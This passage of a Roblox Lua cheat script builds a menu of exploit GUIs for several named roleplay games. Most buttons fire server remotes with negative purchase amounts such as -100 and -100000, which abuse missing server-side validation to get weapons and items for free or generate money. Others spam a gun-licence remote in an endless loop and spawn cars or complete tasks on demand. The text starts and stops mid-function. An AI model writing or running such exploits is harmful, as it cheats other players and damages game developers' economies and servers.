Instance.new("UICorner", amountBox).CornerRadius = UDim.new(0, 6)

--// BUY Button
local buyButton = Instance.new("TextButton", frame)
buyButton.Size = UDim2.new(1, -20, 0, 40)
buyButton.Position = UDim2.new(0, 10, 0, 145)
buyButton.Text = "BUY"
buyButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
buyButton.TextColor3 = Color3.fromRGB(0,0,0)
buyButton.Font = Enum.Font.GothamBold
buyButton.TextSize = 16
Instance.new("UICorner", buyButton).CornerRadius = UDim.new(0, 6)

-- Hover animation
buyButton.MouseEnter:Connect(function()
	buyButton.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
end)
buyButton.MouseLeave:Connect(function()
	buyButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
end)

-- Feedback label
local feedback = Instance.new("TextLabel", frame)
feedback.Size = UDim2.new(1, -20, 0, 20)
feedback.Position = UDim2.new(0, 10, 1, -22)
feedback.BackgroundTransparency = 1
feedback.Font = Enum.Font.Gotham
feedback.TextSize = 12
feedback.TextColor3 = Color3.fromRGB(200, 200, 200)
feedback.Text = ""

-- Feedback function
local function showFeedback(msg, t)
	feedback.Text = msg
	task.delay(t or 2, function()
		if feedback then feedback.Text = "" end
	end)
end

-- Purchase Logic
local function buyItem()
	local item = itemBox.Text
	local amount = tonumber(-amountBox.Text)

	if item == "" or not amount then
		showFeedback("Invalid item or amount!", 2)
		return
	end

	purchaseEvent:FireServer(item, amount)
	showFeedback("Sent: " .. item .. " x" .. amount, 2)
end

buyButton.MouseButton1Click:Connect(buyItem)
itemBox.FocusLost:Connect(function(enter) if enter then buyItem() end end)
amountBox.FocusLost:Connect(function(enter) if enter then buyItem() end end)
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("GUNSHOP AUTO BUY (USELESS)", function()
	-- Services
local player = game.Players.LocalPlayer
local UserInputService = game:GetService("UserInputService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Setup UI
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "GunCommandUI"
screenGui.ResetOnSpawn = false
screenGui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Name = "MainFrame"
frame.Size = UDim2.new(0, 300, 0, 150)
frame.Position = UDim2.new(0.5, -150, 0.5, -75)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = screenGui

local titleLabel = Instance.new("TextLabel")
titleLabel.Text = "GOMA GUN CMDS"
titleLabel.Font = Enum.Font.GothamBold
titleLabel.TextColor3 = Color3.fromRGB(0,0,0) -- White instead of red
titleLabel.TextSize = 16
titleLabel.BackgroundTransparency = 1
titleLabel.Size = UDim2.new(1, 0, 0, 20)
titleLabel.Position = UDim2.new(0, 0, 0, 5)
titleLabel.Parent = frame

local textBox = Instance.new("TextBox")
textBox.Name = "CommandBox"
textBox.Text = ""
textBox.PlaceholderText = "Enter Command (3KTG)"
textBox.Font = Enum.Font.GothamBold
textBox.TextColor3 = Color3.fromRGB(0,0,0)
textBox.TextSize = 24
textBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
textBox.BorderSizePixel = 0
textBox.Size = UDim2.new(0.9, 0, 0, 40)
textBox.Position = UDim2.new(0.05, 0, 0, 40)
textBox.ClearTextOnFocus = false
textBox.Parent = frame

local toggleButton = Instance.new("TextButton")
toggleButton.Text = "OFF"
toggleButton.Font = Enum.Font.GothamBold
toggleButton.TextColor3 = Color3.fromRGB(0,0,0) -- White when OFF
toggleButton.TextSize = 22
toggleButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
toggleButton.BorderSizePixel = 0
toggleButton.Size = UDim2.new(0.6, 0, 0, 35)
toggleButton.Position = UDim2.new(0.2, 0, 0, 95)
toggleButton.Parent = frame

-- Commands Table
local commands = {}
local gunEvent = ReplicatedStorage:FindFirstChild("GunShop") and ReplicatedStorage.GunShop:FindFirstChild("Events") and ReplicatedStorage.GunShop.Events:FindFirstChild("Purchase")

commands["BuySilenced"] = function()
	if gunEvent then
		gunEvent:FireServer("Silenced Pistol", -100)
	end
end

commands["BuyGlock17"] = function()
	if gunEvent then
		gunEvent:FireServer("Glock-17", -100)
	end
end

commands["BuyGlock19"] = function()
	if gunEvent then
		gunEvent:FireServer("Glock-19", -100)
	end
end

commands["BuyDeagle"] = function()
	if gunEvent then
		gunEvent:FireServer("Desert Deagle", -100)
	end
end

commands["BuyAmmo"] = function()
	if gunEvent then
		gunEvent:FireServer("AmmoBox", -100)
	end
end

commands["BuyAllGuns"] = function()
	if gunEvent then
		gunEvent:FireServer("Silenced Pistol", -100)
		gunEvent:FireServer("Glock-17", -100)
		gunEvent:FireServer("Glock-19", -100)
		gunEvent:FireServer("Desert Deagle", -100)
		gunEvent:FireServer("AmmoBox", -100)
	end
end

-- Toggle Logic
local isOn = false

toggleButton.MouseButton1Click:Connect(function()
	isOn = not isOn

	if isOn then
		toggleButton.Text = "ON"
		toggleButton.TextColor3 = Color3.fromRGB(0,0,0)
		local cmdText = textBox.Text
		local commandFunc = commands[cmdText]
		if commandFunc then
			commandFunc()
		else
			warn("Unknown command: " .. cmdText)
		end
	else
		toggleButton.Text = "OFF"
		toggleButton.TextColor3 = Color3.fromRGB(0,0,0) -- White when OFF
	end
end)

-- Drag Logic
local dragging = false
local dragInput, mousePos, framePos

frame.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		dragging = true
		mousePos = input.Position
		framePos = frame.Position

		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

frame.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement then
		dragInput = input
	end
end)

UserInputService.InputChanged:Connect(function(input)
	if input == dragInput and dragging then
		local delta = input.Position - mousePos
		frame.Position = UDim2.new(
			framePos.X.Scale, framePos.X.Offset + delta.X,
			framePos.Y.Scale, framePos.Y.Offset + delta.Y
		)
	end
end)
end)

addMainMenuButton("URBAN DECAY RP (MONSY)", function()
	-- Services
local player = game.Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")

-- UI Setup
local screenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
screenGui.Name = "PurchaseCMDGui"
screenGui.ResetOnSpawn = false

local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, 300, 0, 150)
mainFrame.Position = UDim2.new(0.5, -150, 0.5, -75)
mainFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
mainFrame.BorderSizePixel = 0
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.Parent = screenGui

local titleLabel = Instance.new("TextLabel")
titleLabel.Text = "GOMA URBAN GUN BUY"
titleLabel.Font = Enum.Font.GothamBold
titleLabel.TextColor3 = Color3.fromRGB(0,0,0) -- Changed from red to white
titleLabel.TextSize = 16
titleLabel.BackgroundTransparency = 1
titleLabel.Size = UDim2.new(1, 0, 0, 20)
titleLabel.Position = UDim2.new(0, 0, 0, 5)
titleLabel.Parent = mainFrame

local textBox = Instance.new("TextBox")
textBox.PlaceholderText = "Enter Command (3KTG)"
textBox.Font = Enum.Font.GothamBold
textBox.TextColor3 = Color3.fromRGB(0,0,0)
textBox.TextSize = 20
textBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
textBox.BorderSizePixel = 0
textBox.Size = UDim2.new(0.9, 0, 0, 40)
textBox.Position = UDim2.new(0.05, 0, 0, 40)
textBox.ClearTextOnFocus = false
textBox.Text = ""
textBox.Parent = mainFrame

local toggleButton = Instance.new("TextButton")
toggleButton.Text = "OFF"
toggleButton.Font = Enum.Font.GothamBold
toggleButton.TextColor3 = Color3.fromRGB(0,0,0) -- Changed from red to white
toggleButton.TextSize = 22
toggleButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
toggleButton.BorderSizePixel = 0
toggleButton.Size = UDim2.new(0.6, 0, 0, 35)
toggleButton.Position = UDim2.new(0.2, 0, 0, 95)
toggleButton.Parent = mainFrame

-- Command Table
local purchaseEvent = ReplicatedStorage:WaitForChild("PurchaseEvent")
local commands = {}

commands["BuyAK"] = function()
	purchaseEvent:FireServer("AK-47", -100)
end

commands["BuyAR15"] = function()
	purchaseEvent:FireServer("AR15", -100)
end

commands["BuyVector"] = function()
	purchaseEvent:FireServer("Vector", -100)
end

commands["BuySyringe"] = function()
	purchaseEvent:FireServer("Syringe", -100)
end

commands["BuyP90"] = function()
	purchaseEvent:FireServer("P90", -100)
end

commands["BuyBandage"] = function()
	purchaseEvent:FireServer("Bandage", -100)
end

commands["BuyAmmo1"] = function()
	purchaseEvent:FireServer("AmmoBox_1", -100)
end

commands["BuySten"] = function()
	purchaseEvent:FireServer("Sten Gun", -100)
end

commands["BuyAll2"] = function()
	local items = {
		"AK-47", "AR15", "Vector", "Syringe",
		"P90", "Bandage", "AmmoBox_1", "Sten Gun"
	}
	for _, item in ipairs(items) do
		purchaseEvent:FireServer(item, -100)
	end
end

-- Toggle Logic
local isOn = false

toggleButton.MouseButton1Click:Connect(function()
	isOn = not isOn
	if isOn then
		toggleButton.Text = "ON"
		toggleButton.TextColor3 = Color3.fromRGB(0,0,0)
		local inputCmd = textBox.Text
		local func = commands[inputCmd]
		if func then
			func()
		else
			warn("Unknown command: " .. inputCmd)
		end
	else
		toggleButton.Text = "OFF"
		toggleButton.TextColor3 = Color3.fromRGB(0,0,0) -- White when OFF
	end
end)

-- Optional: Drag support
local dragging, dragInput, startPos, startFramePos
mainFrame.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		dragging = true
		startPos = input.Position
		startFramePos = mainFrame.Position
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

mainFrame.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement then
		dragInput = input
	end
end)

UserInputService.InputChanged:Connect(function(input)
	if dragging and input == dragInput then
		local delta = input.Position - startPos
		mainFrame.Position = UDim2.new(
			startFramePos.X.Scale, startFramePos.X.Offset + delta.X,
			startFramePos.Y.Scale, startFramePos.Y.Offset + delta.Y
		)
	end
end)
end)

addMainMenuButton("LICENCE GIVER SYSTEM (MONSY)", function()
	while true do game:GetService("ReplicatedStorage").GunLicenseGiver:FireServer("User",0.1)
wait()
end
end)

addMainMenuButton("PROMINENCE CITY S1 SPAWN GUN (MONSY)", function()
	--// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = "GiveAllCashGUI"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Position = UDim2.new(0.5, -130, 0.5, -160)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 1
frame.BorderColor3 = Color3.fromRGB(40, 40, 40)
frame.Parent = gui
frame.Active = true
frame.Draggable = true

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(255,255,255)
title.Text = "PROMINENCE CITY S1"
title.TextColor3 = Color3.new(0,0,0)
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

-- List of items to buy
local items = {
    {".50", ".50"},
    {"AmmoBox", "AmmoBox"}
}

local selectedItem = nil

-- Dropdown Button
local dropdown = Instance.new("TextButton")
dropdown.Size = UDim2.new(1, -20, 0, 30)
dropdown.Position = UDim2.new(0, 10, 0, 50)
dropdown.Text = "Select Item"
dropdown.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdown.TextColor3 = Color3.new(0,0,0)
dropdown.Font = Enum.Font.Gotham
dropdown.TextSize = 14
dropdown.Parent = frame
Instance.new("UICorner", dropdown).CornerRadius = UDim.new(0, 6)

-- Dropdown Frame
local itemHeight = 28
local dropdownHeight = #items * itemHeight
local dropdownFrame = Instance.new("Frame")
dropdownFrame.Size = UDim2.new(1, -20, 0, dropdownHeight)
dropdownFrame.Position = UDim2.new(0, 10, 0, 85)
dropdownFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdownFrame.Visible = false
dropdownFrame.Parent = frame
Instance.new("UICorner", dropdownFrame).CornerRadius = UDim.new(0, 5)

-- Dropdown Buttons
for i, item in ipairs(items) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, itemHeight)
    btn.Position = UDim2.new(0, 0, 0, (i - 1) * itemHeight)
    btn.Text = item[1]
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.new(0,0,0)
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 12
    btn.Parent = dropdownFrame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        selectedItem = item[2]
        dropdown.Text = item[1]
        dropdownFrame.Visible = false
    end)
end

-- Toggle Dropdown
dropdown.MouseButton1Click:Connect(function()
    dropdownFrame.Visible = not dropdownFrame.Visible
end)

-- Auto Buy Button
local toggle = Instance.new("TextButton")
toggle.Size = UDim2.new(1, -20, 0, 35)
toggle.Position = UDim2.new(0, 10, 0, 100 + dropdownHeight)
toggle.Text = "Start Auto Buy"
toggle.BackgroundColor3 = Color3.fromRGB(255,255,255)
toggle.TextColor3 = Color3.new(0,0,0)
toggle.Font = Enum.Font.GothamBold
toggle.TextSize = 14
toggle.Parent = frame
Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 6)

-- Auto adjust frame height
local padding = 140 -- title + spacing + toggle
local frameHeight = padding + dropdownHeight
frame.Size = UDim2.new(0, 260, 0, frameHeight)

-- Auto Buy Logic
local isAutoBuying = false
toggle.MouseButton1Click:Connect(function()
    isAutoBuying = not isAutoBuying
    toggle.Text = isAutoBuying and "Stop Auto Buy" or "Start Auto Buy"
    
    while isAutoBuying do
        if selectedItem then
            ReplicatedStorage.GivePistolBox:FireServer(selectedItem, -100000)
            print("Auto-buying " .. selectedItem)
        end
        task.wait(0.001)
    end
end)

-- RightShift toggle GUI
UIS.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.RightShift then
        gui.Enabled = not gui.Enabled
    end
end)
end)

addMainMenuButton("URBAN CITY SPAWN GUN V3 (MONSY)", function()
    --// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = "GiveAllCashGUI"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 200) -- Adjusted to fit just 2 items
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.Position = UDim2.new(0.5, 0, 0.5, 0)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 1
frame.BorderColor3 = Color3.fromRGB(40, 40, 40)
frame.Active = true
frame.Draggable = true
frame.Parent = gui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(255,255,255)
title.Text = "URBAN CITY V3"
title.TextColor3 = Color3.new(0,0,0)
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

-- List of items to buy
local items = {
    {"Suppressed Pistols", "Suppressed Pistols"},
    {"Deagle", "Deagle"}
}

local selectedItem = nil

-- Dropdown Button
local dropdown = Instance.new("TextButton")
dropdown.Size = UDim2.new(1, -20, 0, 30)
dropdown.Position = UDim2.new(0, 10, 0, 50)
dropdown.Text = "Select Item"
dropdown.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdown.TextColor3 = Color3.new(0,0,0)
dropdown.Font = Enum.Font.Gotham
dropdown.TextSize = 14
dropdown.Parent = frame
Instance.new("UICorner", dropdown).CornerRadius = UDim.new(0, 6)

-- Dropdown frame (auto height)
local dropdownFrame = Instance.new("Frame")
dropdownFrame.Size = UDim2.new(1, -20, 0, #items * 30)
dropdownFrame.Position = UDim2.new(0, 10, 0, 85)
dropdownFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdownFrame.Visible = false
dropdownFrame.Parent = frame
Instance.new("UICorner", dropdownFrame).CornerRadius = UDim.new(0, 5)

-- Buttons for dropdown
for i, item in ipairs(items) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, 30)
    btn.Position = UDim2.new(0, 0, 0, (i - 1) * 30)
    btn.Text = item[1]
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.new(0,0,0)
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 12
    btn.Parent = dropdownFrame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        selectedItem = item[2]
        dropdown.Text = item[1]
        dropdownFrame.Visible = false
    end)
end

dropdown.MouseButton1Click:Connect(function()
    dropdownFrame.Visible = not dropdownFrame.Visible
end)

-- Auto Buy Button
local toggle = Instance.new("TextButton")
toggle.Size = UDim2.new(1, -20, 0, 35)
toggle.Position = UDim2.new(0, 10, 0, 85 + (#items * 30) + 10)
toggle.Text = "Start Auto Buy"
toggle.BackgroundColor3 = Color3.fromRGB(255,255,255)
toggle.TextColor3 = Color3.new(0,0,0)
toggle.Font = Enum.Font.GothamBold
toggle.TextSize = 14
toggle.Parent = frame
Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 6)

local isAutoBuying = false

toggle.MouseButton1Click:Connect(function()
    isAutoBuying = not isAutoBuying
    toggle.Text = isAutoBuying and "Stop Auto Buy" or "Start Auto Buy"

    while isAutoBuying do
        if selectedItem then
            ReplicatedStorage.GunStoreFolder.BuyTool:FireServer(selectedItem, -0)
            print("Auto-buying " .. selectedItem)
        end
        task.wait(5)
    end
end)

-- Toggle GUI visibility with RightShift
UIS.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.RightShift then
        gui.Enabled = not gui.Enabled
    end
end)
end)

local function addMainMenuButton(text, callback)
	local panel = allTabPanels["ROLEPLAY MENU 2"]
	if not panel then return end
	local btn = new("TextButton", {
		Size = UDim2.new(1, -16, 0, 38),
		BackgroundColor3 = Color3.fromRGB(255,255,255),
		TextColor3 = Color3.new(0,0,0),
		Font = Enum.Font.GothamSemibold,
		TextSize = 14,
		Text = text,
		AutoButtonColor = false,
		Parent = panel,
	})
	new("UICorner", {CornerRadius = UDim.new(0,6), Parent = btn})
	btn.MouseEnter:Connect(function()
		TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(20,20,20)}):Play()
	end)
	btn.MouseLeave:Connect(function()
		TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(255,255,255)}):Play()
	end)
	btn.MouseButton1Click:Connect(function()
		clickSound:Play()
		callback()
	end)
end

--// 8 Buttons in Main Menu
addMainMenuButton("BAGONG BARYO SPAWNCAR (MONSY)", function()
	local player = game.Players.LocalPlayer
local rs = game:GetService("ReplicatedStorage")

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = "CarSpawnGUI"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

-- Main Frame
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 250, 0, 230)
frame.Position = UDim2.new(0.5, -125, 0.5, -115)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = gui

-- Rounded Corners
local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 15)
corner.Parent = frame

-- Title
local title = Instance.new("TextLabel")
title.Text = "Choose Your Vehicle"
title.Size = UDim2.new(1, 0, 0, 40)
title.BackgroundTransparency = 1
title.TextColor3 = Color3.fromRGB(0,0,0)
title.Font = Enum.Font.GothamBold
title.TextSize = 18
title.Parent = frame

-- Button function (each with its own car name)
local function createButton(displayName, carName, posY)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0.8, 0, 0, 35)
    btn.Position = UDim2.new(0.1, 0, 0, posY)
    btn.Text = displayName
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.fromRGB(0,0,0)
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 16
    btn.Parent = frame

    local btnCorner = Instance.new("UICorner")
    btnCorner.CornerRadius = UDim.new(0, 8)
    btnCorner.Parent = btn

    btn.MouseEnter:Connect(function()
        btn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    end)
    btn.MouseLeave:Connect(function()
        btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    end)

    btn.MouseButton1Click:Connect(function()
        local args = {
            [1] = carName
        }

        rs:WaitForChild("Car Dealership System", 9e9)
            :WaitForChild("Events", 9e9)
            :WaitForChild("SpawnCarEvent", 9e9)
            :FireServer(unpack(args))
    end)
end

-- Create Buttons
createButton("Civic", "Civic", 50)
createButton("Subaru", "subaru", 90)
createButton("CarName", "CarName", 130)
createButton("Dirtbike", "Dirtbike", 170) 
end)

--// 8 Buttons in Main Menu
addMainMenuButton("BAGONG BARYO REFRESH (MONSY)", function()
	local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer

-- GUI
local gui = Instance.new("ScreenGui")
gui.Name = "AutoRefreshGUI"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

-- Main Frame — PURE WHITE
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 180, 0, 100)
frame.Position = UDim2.new(0.5, -90, 0.5, -50)
frame.BackgroundColor3 = Color3.new(1, 1, 1)        -- PURE WHITE
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = gui

-- Rounded Corners
local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 12)
corner.Parent = frame

-- Title — BLACK TEXT
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 30)
title.BackgroundTransparency = 1                  -- WALANG BACKGROUND
title.Text = "Auto Refresh"
title.TextColor3 = Color3.new(0,0,0)               -- BLACK TEXT
title.Font = Enum.Font.GothamBold
title.TextSize = 18
title.Parent = frame

-- Refresh Button — LIGHT GRAY (para kita) + BLACK TEXT
local refreshButton = Instance.new("TextButton")
refreshButton.Size = UDim2.new(0.8, 0, 0.4, 0)
refreshButton.Position = UDim2.new(0.1, 0, 0.45, 0)
refreshButton.BackgroundColor3 = Color3.fromRGB(230, 230, 230)  -- LIGHT GRAY
refreshButton.Text = "Refresh"
refreshButton.TextColor3 = Color3.new(0,0,0)                    -- BLACK TEXT
refreshButton.Font = Enum.Font.GothamBold
refreshButton.TextSize = 16
refreshButton.BorderSizePixel = 1
refreshButton.BorderColor3 = Color3.new(0,0,0)                 -- BLACK BORDER
refreshButton.Parent = frame

-- Button rounded
local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 10)
buttonCorner.Parent = refreshButton

-- Hover effect (mas maganda pa rin)
refreshButton.MouseEnter:Connect(function()
    refreshButton.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
end)

refreshButton.MouseLeave:Connect(function()
    refreshButton.BackgroundColor3 = Color3.fromRGB(230, 230, 230)
end)

-- Button Function (EXACT SAME)
refreshButton.MouseButton1Click:Connect(function()
    local args = { [1] = "Boy" }
    ReplicatedStorage:WaitForChild("SaveCharacterEvent", 9e9):FireServer(unpack(args))
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("THE BILLIONARE CITY AUTO OXY (MONSY)", function()
	local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer
local oxyRemote = ReplicatedStorage:WaitForChild("OxyComplete")

--// ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "AutoOxyGUI"
screenGui.Parent = player:WaitForChild("PlayerGui")

--// Main Frame
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 250, 0, 120)
frame.Position = UDim2.new(0.5, -125, 0.5, -60)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255) -- ultra black
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = screenGui
frame.AnchorPoint = Vector2.new(0.5, 0.5)

--// Rounded corners
local uiCorner = Instance.new("UICorner")
uiCorner.CornerRadius = UDim.new(0, 15)
uiCorner.Parent = frame

--// Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundTransparency = 1
title.Text = "AUTO OXY"
title.TextColor3 = Color3.fromRGB(0,0,0)
title.Font = Enum.Font.GothamBold
title.TextSize = 22
title.Parent = frame

--// Button
local oxyButton = Instance.new("TextButton")
oxyButton.Size = UDim2.new(0, 200, 0, 50)
oxyButton.Position = UDim2.new(0.5, -100, 0, 60)
oxyButton.BackgroundColor3 = Color3.fromRGB(255,255,255) -- full black
oxyButton.Text = "OXY"
oxyButton.TextColor3 = Color3.fromRGB(0,0,0)
oxyButton.Font = Enum.Font.GothamBold
oxyButton.TextSize = 20
oxyButton.Parent = frame

--// Button rounded corners
local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 12)
buttonCorner.Parent = oxyButton

--// Button click function
oxyButton.MouseButton1Click:Connect(function()
    oxyRemote:FireServer("APOY", -1)
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("BAGONG BARYO REFRESH WAYPOINT (MONSY)", function()
	local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer

-- Variables
local savedWaypoint = nil

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = "WaypointGUI"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

-- Main Frame — PURE WHITE
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 200, 0, 170)
frame.Position = UDim2.new(0.5, -100, 0.5, -85)
frame.BackgroundColor3 = Color3.new(1, 1, 1)        -- PURE WHITE
frame.BorderSizePixel = 0
frame.BackgroundTransparency = 0
frame.Active = true
frame.Draggable = true
frame.Parent = gui

-- Rounded corners
local corner = Instance.new("UICorner", frame)
corner.CornerRadius = UDim.new(0, 12)

-- Title — BLACK TEXT
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 35)
title.BackgroundTransparency = 1
title.Text = "AUTO WAYPOINT"
title.TextColor3 = Color3.new(0,0,0)                -- BLACK TEXT
title.Font = Enum.Font.GothamBold
title.TextSize = 18
title.Parent = frame

-- Function to create buttons (WHITE THEME)
local function createButton(text, order)
    local button = Instance.new("TextButton")
    button.Size = UDim2.new(0.8, 0, 0, 35)
    button.Position = UDim2.new(0.1, 0, 0, 40 + (order * 40))
    button.BackgroundColor3 = Color3.fromRGB(240, 240, 240)  -- LIGHT GRAY (para kita)
    button.TextColor3 = Color3.new(0,0,0)                    -- BLACK TEXT
    button.Text = text
    button.Font = Enum.Font.GothamBold
    button.TextSize = 16
    button.BorderSizePixel = 1
    button.BorderColor3 = Color3.new(0,0,0)                  -- BLACK BORDER

    local btnCorner = Instance.new("UICorner", button)
    btnCorner.CornerRadius = UDim.new(0, 10)
    button.Parent = frame
    return button
end

-- Create Buttons
local setWaypointBtn = createButton("Set Waypoint", 0)
local refreshBtn = createButton("Refresh", 1)
local deleteWaypointBtn = createButton("Delete Waypoint", 2)

--// BUTTON FUNCTIONS (EXACT SAME)

-- SET WAYPOINT
setWaypointBtn.MouseButton1Click:Connect(function()
    local char = player.Character or player.CharacterAdded:Wait()
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if hrp then
        savedWaypoint = hrp.Position
        player:WaitForChild("PlayerGui"):SetCore("SendNotification", {
            Title = "Waypoint Set",
            Text = "Respawn point saved!",
            Duration = 2
        })
    end
end)

-- REFRESH BUTTON
refreshBtn.MouseButton1Click:Connect(function()
    local args = { [1] = "Boy" }
    ReplicatedStorage:WaitForChild("SaveCharacterEvent", 9e9):FireServer(unpack(args))
end)

-- DELETE WAYPOINT
deleteWaypointBtn.MouseButton1Click:Connect(function()
    savedWaypoint = nil
    player:WaitForChild("PlayerGui"):SetCore("SendNotification", {
        Title = "Waypoint Deleted",
        Text = "Respawn point removed!",
        Duration = 2
    })
end)

--// RESPAWN HANDLER (EXACT SAME)
player.CharacterAdded:Connect(function(char)
    if savedWaypoint then
        char:WaitForChild("HumanoidRootPart").CFrame = CFrame.new(savedWaypoint)
    end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("CAVITE ROLEPLAY BLACK MARKET (MONSY)", function()
	local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = "GiveAllCashGUI"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

